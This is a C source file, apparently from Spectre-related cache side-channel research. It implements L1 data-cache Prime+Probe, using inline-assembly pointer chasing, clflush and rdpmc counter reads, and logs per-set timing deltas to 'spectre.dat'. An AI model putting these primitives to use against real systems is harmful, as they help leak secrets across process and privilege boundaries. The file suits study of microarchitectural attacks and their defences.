#include <stdio.h>

#include "../include/cell.h"

/*
 * When configuring the PMCs by writing to their respective
 * MSRs, they can be accessed in the order in which they were
 * assigned in the MSRs, the first MSR can be accessed by 0x00
 * the second one by 0x01 and so on...
 */
#define PMC_0 0x00 // Requests to L2 Group1, Mask: 0x80
#define PMC_1 0x00 // Requests to L2 Group1, Mask: 0x02
#define PMC_2 0x01 // Core to L2 Cacheable Request Access Status
#define PMC_3 0x02 // Cycles not in Halt

extern struct cell *U[L1_WAYS];

/* Results */
FILE *f = NULL;

void
clflush(void * address){
	asm volatile(
		"clflush (%%rsi)"
		:
		: "S" (address)
		: "memory"
	);
}

void
prime_L1D_set(int set){
	void *address = (void *) &U[0][set].next;
	asm volatile(
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mfence"
		:
		: "S" (address)
		: "memory"
	);
}

void
probe_L1D_set_pmc(unsigned int set){
	unsigned long delta_pmc;
	void *address = (void *)&U[7][set].prev;
	asm volatile(
		"mfence\n\t"
		"rdpmc\n\t"
		"mov %%eax, %%ebx\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mov (%%rsi), %%rsi\n\t"
		"mfence\n\t"
		"rdpmc\n\t"
		"sub %%eax, %%ebx\n\t"
		"neg %%ebx"
		: "=b" (delta_pmc)
		: "S" (address), "c" (PMC_0)
		: "memory"
	);
	U[0][set].delta = delta_pmc;
}

/*
 * Prime all 64 L1D sets.
 */
void
prime_L1D_cache(){
	for(int s = 0; s < L1_SETS; s++)
		prime_L1D_set(s);
}

/*
 * Probe all 64 L1D sets and save the results.
 */
void
probe_L1D_cache(){
	for(int s = 0; s < L1_SETS; s++)
		probe_L1D_set_pmc(s);
	save_delta();
}

/*
 * Save the currently stored 'delta' values into
 * the output file 'spectre.dat'.
 */
void
save_delta(){
	for(int s = 0; s < L1_SETS; s++)
		fprintf(f, "%lu ", U[0][s].delta);
	fprintf(f, "\n");
}

/*
 * Open the output file 'spectre.dat'.
 */
void
open_output_file(){
	f = fopen("spectre.dat", "a");
}

/*
 * Close the output file.
 */
void
close_output_file(){
	fclose(f);
}
